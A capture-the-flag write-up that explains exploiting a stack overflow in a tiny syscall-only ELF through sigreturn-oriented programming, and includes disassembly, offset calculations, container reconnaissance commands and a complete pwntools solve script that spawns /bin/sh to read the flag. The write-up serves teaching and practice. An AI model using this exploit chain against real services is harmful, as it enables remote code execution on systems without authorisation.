# Planetary Probe - writeup (SROP, beginner-friendly)

## What the task was

The challenge gives us a tiny x86-64 ELF called `total_recall` and a remote service:

```text
<challenge-host>:<port>
```

The goal is to read the flag from the challenge container.

The binary is unusually small. It does not have a normal libc-driven program structure; the interesting code is basically a few raw Linux syscalls.

The important behavior is:

1. leak 8 bytes from the stack;
2. read 24 bytes;
3. read up to `0x400` bytes into the stack;
4. `ret`;
5. exit.

The second read is an obvious stack overflow. The interesting part is finding a way to turn that overflow into useful register control with almost no gadgets.

---

## First look at the binary

The relevant disassembly is:

```asm
401000: call   0x401016
401005: call   0x40104f
40100a: mov    rax,0x3c
401011: xor    rdi,rdi
401014: syscall

401016:
    push   rsp
    mov    rsi,rsp
    mov    rdi,0x1
    mov    rdx,0x8
    mov    rax,0x1
    syscall
    pop    rax
    lea    rsi,[rsp-0x40]
    mov    rdi,0x0
    mov    rdx,0x18
    mov    rax,0x0
    syscall
    ret

40104f:
    lea    rsi,[rsp-0x80]
    mov    rdi,0x0
    mov    rdx,0x400
    mov    rax,0x0
    syscall
    ret
```

The useful instruction sequences are:

```text
0x401021 : write setup / syscall
0x401045 : mov rax,0 ; syscall ; ret
0x40104c : syscall ; ret
0x40104e : ret
```

There is no normal gadget set such as:

```text
pop rdi ; ret
pop rsi ; ret
pop rdx ; ret
pop rax ; ret
```

So a standard ret2libc-style ROP chain is awkward here.

---

## Step 1: calculate the exact stack layout

The first function does this:

```asm
push rsp
mov rsi,rsp
mov rdi,1
mov rdx,8
mov rax,1
syscall
```

So the value written to stdout is the original stack pointer.

Afterwards:

```asm
pop rax
```

restores that same stack pointer, and the program calls `0x40104f`.

Therefore:

```text
leak = RSP when entering 0x40104f
```

Then `0x40104f` executes:

```asm
lea rsi,[rsp-0x80]
mov rdi,0
mov rdx,0x400
mov rax,0
syscall
ret
```

So the vulnerable buffer is:

```text
buf = leak - 0x80
```

The `ret` takes its return address from `[rsp]`, which is exactly `leak`.

Therefore:

```text
saved RIP = leak = buf + 0x80
```

The second read consequently looks like this:

```text
buf+0x00 ... buf+0x7f   padding
buf+0x80               saved RIP
buf+0x88               next stack qword
```

This exact `-0x80` offset was important. Earlier attempts using `leak-0x88` failed because the return-address calculation was off by 8 bytes.

---

## Step 2: prove RIP control before doing anything complicated

Before attempting SROP, I used a tiny observable payload.

Putting:

```text
buf+0x80 = 0x401021
```

made the remote target print:

```text
PWNTEST!
```

That proved the stack arithmetic and saved-RIP offset were correct.

This was useful because it separated the simple stack-overflow problem from the harder SROP problem.

---

## Step 3: why SROP is the interesting primitive

Linux has a special syscall called `rt_sigreturn`.

Its syscall number on x86-64 is:

```text
15
```

When syscall 15 executes, the kernel restores a whole register state from a signal frame on the stack.

That means we do not need individual `pop` gadgets. A successful sigreturn can restore:

```text
RAX
RDI
RSI
RDX
RIP
RSP
...
```

all at once.

The only question is: how do we get `RAX=15`?

---

## Step 4: make read() return 15

The binary contains:

```asm
0x401045:
    mov rax,0
    syscall
    ret
```

This is effectively a `read()` followed by `ret`.

If we arrange for this read to receive exactly 15 bytes, the return value from the syscall is 15:

```text
RAX = 15
```

Then its `ret` can jump to:

```text
0x40104c
```

which is:

```asm
syscall
ret
```

At that exact moment:

```text
RAX = 15
```

so the kernel interprets the syscall as:

```text
rt_sigreturn
```

That is the whole trick.

---

## Step 5: place the sigreturn frame correctly

The stack layout becomes:

```text
buf+0x80  -> 0x401045
buf+0x88  -> 0x40104c
buf+0x90  -> SigreturnFrame
```

Why `buf+0x90`?

The first vulnerable `ret` pops the qword at `buf+0x80`, so `RSP` becomes `buf+0x88`.

Then `0x401045` performs its `read()` and returns. Its `ret` pops the qword at `buf+0x88`, which is `0x40104c`.

Now `RSP` is `buf+0x90`.

Then `0x40104c` executes syscall 15, and the kernel consumes the signal frame starting at the current stack pointer:

```text
buf+0x90
```

Putting the frame at `buf+0x98` was another earlier mistake.

---

## Step 6: prove that SROP really works

I first used a harmless test frame.

The frame was configured to call:

```text
write(1, "SROP_OK!", 8)
```

The remote service replied:

```text
SROP_OK!
```

So the full chain was confirmed:

```text
stack overflow
    -> 0x401045
    -> read() returns 15
    -> RAX=15
    -> 0x40104c
    -> rt_sigreturn
    -> restored registers
    -> write("SROP_OK!")
```

At this point we know the hard part of the exploit is working.

---

## What I tried first

### Direct stack shellcode

The stack leak makes the address of our payload predictable, so the obvious first attempt was:

```text
saved RIP -> shellcode on the stack
```

That produced no output remotely.

Rather than spending time guessing whether NX or another detail was responsible, I moved to SROP, which does not require a large gadget set.

### mprotect + stack shellcode

A natural next idea was:

```text
mprotect(stack_page, 0x1000, RWX)
```

from a sigreturn frame and then return to shellcode.

That is a valid pattern, but it adds another dependency and another failure point. Once SROP was already confirmed, there was a simpler solution: use the sigreturn frame itself to perform `execve()`.

That avoids needing an executable stack entirely.

---

## Step 7: use SROP for execve()

A sigreturn frame can set all the registers needed for:

```text
execve(path, argv, envp)
```

The final frame sets:

```text
RAX = 59                  execve
RDI = address of /bin/sh
RSI = address of argv[]
RDX = 0
RIP = 0x40104c            syscall
```

The argument array is:

```text
[
    "/bin/sh",
    "-c",
    "cat /ctf/flag.txt",
    NULL
]
```

So the restored register state is equivalent to:

```c
execve(
    "/bin/sh",
    ["/bin/sh", "-c", "cat /ctf/flag.txt", NULL],
    NULL
);
```

---

## Step 8: find the real flag path

My first assumption was that the flag was stored at:

```text
/flag
```

That was wrong. The shell replied:

```text
cat: /flag: No such file or directory
```

Since the shell itself was already known to work, I used it to inspect the container:

```bash
pwd
ls -la /
find / -maxdepth 4 -type f -iname '*flag*' 2>/dev/null
```

The important result was:

```text
/ctf/flag.txt
```

The current working directory was also:

```text
/ctf
```

So the final command is simply:

```text
cat /ctf/flag.txt
```

---

## Final exploit chain

The complete exploit is:

```text
1. Receive the 8-byte stack leak
2. Calculate:
       buf = leak - 0x80

3. Send 24 bytes for the first read

4. Send the 0x400-byte overflow:
       buf+0x80 = 0x401045
       buf+0x88 = 0x40104c
       buf+0x90 = SigreturnFrame

5. Send exactly 15 bytes

6. 0x401045 executes read()
       read() returns 15
       -> RAX=15

7. ret -> 0x40104c

8. syscall with RAX=15
       -> rt_sigreturn

9. Kernel restores:
       RAX = 59
       RDI = "/bin/sh"
       RSI = argv[]
       RDX = 0
       RIP = 0x40104c

10. execve("/bin/sh", ...)

11. Shell executes:
       cat /ctf/flag.txt

12. Receive the flag
```

---

## Final `solve.py`

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

HOST = '<challenge-host>'  # challenge instance (closed after the event)
PORT = 26003

io = remote(HOST, PORT)

leak = u64(io.recvn(8))
buf = leak - 0x80

READ24  = 0x401045
SYSCALL = 0x40104c

log.success(f"leak = {hex(leak)}")
log.success(f"buf  = {hex(buf)}")

# First 24-byte read
io.send(b'A' * 24)

# Memory layout inside the second read
FRAME = 0x90

SH_OFF   = 0x250
C_OFF    = 0x258
CMD_OFF  = 0x280
ARGV_OFF = 0x350

sh_addr   = buf + SH_OFF
c_addr    = buf + C_OFF
cmd_addr  = buf + CMD_OFF
argv_addr = buf + ARGV_OFF

cmd = b'cat /ctf/flag.txt\x00'

frame = SigreturnFrame()

# execve("/bin/sh",
#        ["/bin/sh", "-c", "cat /ctf/flag.txt", NULL],
#        NULL)
frame.rax = 59
frame.rdi = sh_addr
frame.rsi = argv_addr
frame.rdx = 0
frame.rip = SYSCALL
frame.rsp = buf + 0x3f0

p = bytearray(b'\x00' * 0x400)

# vulnerable ret -> 0x401045
# 0x401045 read() returns 15 -> RAX=15
# ret -> 0x40104c -> rt_sigreturn
p[0x80:0x88] = p64(READ24)
p[0x88:0x90] = p64(SYSCALL)

# Signal frame
fb = bytes(frame)
assert len(fb) == 248
p[FRAME:FRAME + 248] = fb

# Strings
p[SH_OFF:SH_OFF + 8] = b'/bin/sh\x00'
p[C_OFF:C_OFF + 3] = b'-c\x00'
p[CMD_OFF:CMD_OFF + len(cmd)] = cmd

# argv[] = { "/bin/sh", "-c", command, NULL }
p[ARGV_OFF:ARGV_OFF + 8] = p64(sh_addr)
p[ARGV_OFF + 8:ARGV_OFF + 16] = p64(c_addr)
p[ARGV_OFF + 16:ARGV_OFF + 24] = p64(cmd_addr)
p[ARGV_OFF + 24:ARGV_OFF + 32] = p64(0)

assert len(p) == 0x400

log.info(f"frame = {hex(buf + FRAME)}")
log.info(f"cmd   = {hex(cmd_addr)}")
log.info(f"argv  = {hex(argv_addr)}")

io.send(bytes(p))

# Exactly 15 bytes => read() returns 15 => RAX=15 => rt_sigreturn
sleep(0.2)
io.send(b'X' * 15)

data = io.recvall(timeout=5)

print()
print("OUTPUT:", repr(data))
print(data.decode(errors='replace'))
```

Run with:

```bash
python3 solve.py
```

---

## Result

The exploit successfully reached a shell through SROP and read the flag from:

```text
/ctf/flag.txt
```

Flag:

```text
sun{...}  (masked)
```

The exact flag value is omitted from this write-up.

---

## One-paragraph version

`total_recall` is a tiny syscall-only ELF that leaks a stack address and then performs a `0x400`-byte read directly over the stack. The saved return address is at `buf+0x80`, so RIP is controllable. There are almost no normal ROP gadgets, but `0x401045` is `mov rax,0; syscall; ret` and `0x40104c` is `syscall; ret`. By making the extra `read()` return exactly 15 bytes, `RAX` becomes 15; returning into `0x40104c` therefore triggers `rt_sigreturn`. A `SigreturnFrame` gives full register control, so instead of building a large ROP chain I call `execve("/bin/sh", ["/bin/sh", "-c", "cat /ctf/flag.txt", NULL], NULL)`. The only final detail was discovering that the flag is stored at `/ctf/flag.txt`, not `/flag`.

---

## Lessons learned

1. Get the stack arithmetic exactly right before building the exploit.
2. Prove RIP control with a tiny observable payload before attempting SROP.
3. Tiny binaries with raw syscalls can still be highly exploitable.
4. A `read()` returning 15 is a convenient way to produce `RAX=15`.
5. `syscall` + `rt_sigreturn` can replace a whole collection of missing `pop` gadgets.
6. Once SROP works, a direct `execve()` frame is simpler than adding shellcode and `mprotect`.
7. When `/flag` is missing, inspect the actual challenge container instead of assuming the path.
